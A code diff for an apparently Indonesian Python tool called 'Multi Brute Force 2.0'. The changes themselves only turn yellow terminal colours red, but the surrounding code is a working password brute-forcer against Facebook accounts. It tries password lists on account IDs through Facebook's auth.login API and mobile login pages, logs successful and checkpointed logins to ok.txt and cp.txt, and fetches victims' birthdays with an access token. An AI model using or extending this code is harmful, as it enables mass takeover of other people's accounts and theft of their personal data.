@@ -9,10 +9,10 @@ from datetime import date
 from datetime import datetime
 current = datetime.now()
 
-p = "\x1b[0;33m" # putih
+p = "\x1b[0;31m" # putih
 m = "\x1b[0;31m" # merah
 h = "\x1b[0;32m" # hijau
-k = "\x1b[0;33m" # kuning
+k = "\x1b[0;31m" # kuning
 b = "\x1b[0;34m" # biru
 u = "\x1b[0;35m" # ungu
 o = "\x1b[0;36m" # biru muda
@@ -33,7 +33,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""\x1b[0;33m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By ALOK BOCIL  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/BocilAlok ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
+    print("""\x1b[0;31m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By ALOK BOCIL  │\n       /  ^ \/ / // /  ^ \      │   •• Github.com/BocilAlok ••  │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -517,10 +517,10 @@ def brute(user, passs):
       api='https://b-api.facebook.com/method/auth.login'
       response=requests.get(api, params=params)
       if re.search('(EAAA)\w+', str(response.text)):
-        print('\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
         break
       elif 'www.facebook.com' in response.json()['error_msg']:
-        print('\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s '%(str(user), str(pw)))
         break
   except: pass
 
@@ -848,19 +848,19 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -939,26 +939,26 @@ class crackttl:
 						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
-						print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s • %s          "%(fl.get("id"),i,ttl)))
+						print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s • %s          "%(fl.get("id"),i,ttl)))
 						self.cp.append("%s • %s • %s"%(fl.get("id"),i,ttl))
 						open("cp.txt","a+").write("%s • %s • %s\n"%(fl.get("id"),i,ttl))
 						break
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -1033,19 +1033,19 @@ class crackffb:
 				log=f_fb(fl.get("id"),
 					i,"https://free.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
 			self.ko+=1
-			print("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+			print("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
 		except:
 			self.main(fl)
 
@@ -1120,7 +1120,7 @@ class bapi:
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
       self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
+      print(("\r\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
       ok.append(username + " • " + password)
       save = open("ok.txt", "a")
       save.write(str(username) + " • " + str(password) + "\n")
@@ -1129,7 +1129,7 @@ class bapi:
     else:
       if "www.facebook.com" in response.json()["error_msg"]:
         self.cp.append(username + " • " + password)
-        print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
+        print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s %s               "%(username,password,N)))
         save = open("cp.txt", "a+")
         save.write(str(username) + " • " + str(password) + "\n")
         save.close()
@@ -1146,7 +1146,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1157,7 +1157,7 @@ class bapi:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 class bapittl:
   def __init__(self,isifile):
@@ -1230,7 +1230,7 @@ class bapittl:
     response = requests.get(api, params=params)
     if re.search("(EAAA)\\w+", response.text):
       self.ok.append(username + " • " + password)
-      print(("\r\x1b[0;32m[\x1b[0;33mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
+      print(("\r\x1b[0;32m[\x1b[0;31mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
       ok.append(username + " • " + password)
       save = open("ok.txt", "a")
       save.write(str(username) + " • " + str(password) + "\n")
@@ -1244,7 +1244,7 @@ class bapittl:
           ttl=tt["birthday"]
         except:pass
         self.cp.append(username + " • " + password + " • " + ttl)
-        print(("\r\x1b[0;33m[\x1b[0;33mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
+        print(("\r\x1b[0;31m[\x1b[0;31mCP\x1b[0;31m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
         save = open("cp.txt", "a+")
         save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
         save.close()
@@ -1261,7 +1261,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
     else:
       self.loop += 1
       for pw in self.setpw:
@@ -1272,7 +1272,7 @@ class bapittl:
             break
         except:
           continue
-        print(("\r\x1b[0;33m[\x1b[0;33mCrack\x1b[0;33m]\x1b[0;33m %s/%s \x1b[0;32m[\x1b[0;33mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;33mCP : %s\x1b[0;33m]\x1b[0;33m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
+        print(("\r\x1b[0;31m[\x1b[0;31mCrack\x1b[0;31m]\x1b[0;31m %s/%s \x1b[0;32m[\x1b[0;31mOK : %s\x1b[0;32m] \x1b[0;31m[\x1b[0;31mCP : %s\x1b[0;31m]\x1b[0;31m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
 
 ### RESULT ###
 
